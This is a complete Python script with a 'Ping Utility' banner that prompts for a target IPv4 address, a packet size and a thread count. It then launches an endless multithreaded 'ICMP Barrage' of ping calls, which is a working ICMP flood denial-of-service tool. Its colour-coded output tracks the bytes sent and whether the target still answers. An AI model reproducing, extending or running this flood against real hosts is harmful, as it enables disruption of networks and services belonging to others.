#!/usr/bin/env python3

from concurrent.futures import thread

try:
    from colorama import init, Fore, Back, Style
    import subprocess
    import threading
    import logging
    import math
    import time
    import sys
    import os
except Exception as e:
    print("[!] Library import error: %s " % e)

logging.basicConfig(format="%(message)s", level=logging.INFO)

init(convert=True)

class Ping():        

    def __init__(self,target,tx_bytes,thread_count):
        self.start_time       = time.perf_counter()
        self.total_bytes      = 0
        self.total_data       = ''
        self.target           = target
        self.bytes_per_packet = tx_bytes
        self.thread_count     = thread_count

    def ConvertBytes(self,input_bytes):
        if(input_bytes == 0):
            return "0B"
        else:
            size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
            i = int(math.floor(math.log(input_bytes, 1024)))
            p = math.pow(1024, i)
            s = round(input_bytes / p, 2)
            ret_value = "%s %s" % (s, size_name[i])
            return ret_value

    def SendPing(self):
        self.total_bytes += int(self.bytes_per_packet)
        converted_bytes  = self.ConvertBytes(self.total_bytes)
        current_time     = time.perf_counter()
        elapsed_time     = current_time - self.start_time
        self.total_data  = converted_bytes
        tx_bytes = str(self.bytes_per_packet)
        if(os.name == 'nt'):
            output = subprocess.Popen(['ping','-n','1','-w','150','-l',tx_bytes,str(self.target)],stdout=subprocess.PIPE).communicate()[0]
        else:
            output = subprocess.Popen(['ping','-c','1','-w','150','-s',tx_bytes,str(self.target)],stdout=subprocess.PIPE).communicate()[0]
        if('Reply' in output.decode('utf-8')):
            logging.info(Style.BRIGHT + Back.BLACK + Fore.GREEN  + "[*] %s sent to -> %s in %0.2f (s)" % (self.total_data,self.target,elapsed_time))
        else:
            logging.info(Style.BRIGHT + Back.BLACK + Fore.RED    + "[*] %s sent to -> %s in %0.2f (s)" % (self.total_data,self.target,elapsed_time))
        try:
            if(os.name == 'nt'):
                os.system('cls')
            else:
                os.system('clear')
        except:
            pass

    def ContinuousPingVolley(self):
        try:
            while(True):
                for i in range(0,self.thread_count):
                    try:
                        t = threading.Thread(target=self.SendPing)
                        t.daemon = True
                        t.start()
                    except:
                        pass
        except KeyboardInterrupt:
            logging.info("[!] Interrupt received , departing")
            time.sleep(1)
            sys.exit(1)

def main():
    #
    print(Style.BRIGHT + Back.BLACK + Fore.GREEN + """
    _____________                                 
___  __ \__(_)_____________ _                 
__  /_/ /_  /__  __ \_  __ `/                 
_  ____/_  / _  / / /  /_/ /                  
/_/     /_/  /_/ /_/_\__, /                   
                    /____/                    
_____  __________________________             
__  / / /_  /___(_)__  /__(_)_  /_____  __    
_  / / /_  __/_  /__  /__  /_  __/_  / / /    
/ /_/ / / /_ _  / _  / _  / / /_ _  /_/ /     
\____/  \__/ /_/  /_/  /_/  \__/ _\__, /      
                                 /____/
                                 
    """)
    #
    target_address = input("[+] Enter the target IPV4 address-> ")
    tx_byte_count  = input("[+] Enter the transmission byte count-> ")
    thread_count   = int(input("[+] Enter the number of threads to allocate-> "))
    #
    print(Style.BRIGHT + Back.BLACK + Fore.YELLOW+ "[~] Please Note: ")
    print(Style.BRIGHT + Back.BLACK + Fore.GREEN+ "[~] Green text means that the target is responding to ICMP")
    print(Style.BRIGHT + Back.BLACK + Fore.RED+ "[~] Red text means that the target is not responding to ICMP")
    #
    time.sleep(3)
    #
    print(Style.BRIGHT + Back.RED + Fore.WHITE    + "[*] Starting ICMP Barrage ")
    time.sleep(1)
    #
    BarrageInstance = Ping(target_address,tx_byte_count,thread_count)
    BarrageInstance.ContinuousPingVolley()

if(__name__ == '__main__'):
    main()